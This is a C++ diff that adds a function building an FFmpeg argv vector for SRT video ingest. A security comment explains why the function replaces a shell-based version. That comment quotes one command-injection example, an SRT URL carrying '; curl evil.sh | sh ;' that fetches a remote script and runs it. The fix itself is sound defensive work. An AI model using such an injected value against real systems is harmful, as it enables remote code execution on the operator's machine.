@@ -150,4 +150,38 @@ inline std::string redactedSrtUrl(const std::string& url) {
   return redacted;
 }
 
+// Build the FFmpeg ARGV that decodes one SRT source into raw BGRA on stdout.
+// Output is forced to a fixed size so the reader can consume whole frames without
+// negotiating format mid-stream; whatever resolution the contributor sends is
+// scaled to the source's configured geometry.
+//
+// SECURITY: this returns an argv VECTOR, never a shell string. The previous
+// version interpolated the SRT url into one command line and ran it through
+// `/bin/sh -c`, which is arbitrary command execution: the url is built from
+// operator-entered host/port/streamId/passphrase, and buildSrtUrl deliberately
+// "tolerates a pasted srt://host:port" because pasting a remote contributor's
+// connection string IS the workflow. A guest supplying
+//   srt://h:9000" ; curl evil.sh | sh ; "
+// would have run as the operator. Nothing validated metacharacters. Passing
+// argv straight to execvp removes the shell from the path entirely, so a url
+// can only ever be one ffmpeg argument no matter what it contains.
+inline std::vector<std::string> buildSrtIngestArgv(const std::string& executable,
+                                                   const std::string& url,
+                                                   int width, int height, int frameRate) {
+  return {
+      executable,
+      "-hide_banner", "-loglevel", "error",
+      // Contribution feeds are live: do not buffer ahead of real time.
+      "-fflags", "nobuffer", "-flags", "low_delay",
+      "-i", url,
+      // Video only for now; embedded contribution audio is a follow-up.
+      "-an",
+      "-f", "rawvideo", "-pix_fmt", "bgra",
+      "-s", std::to_string(width) + "x" + std::to_string(height),
+      "-r", std::to_string(frameRate),
+      "pipe:1",
+  };
+}
+
+
 }  // namespace corevideo::modules
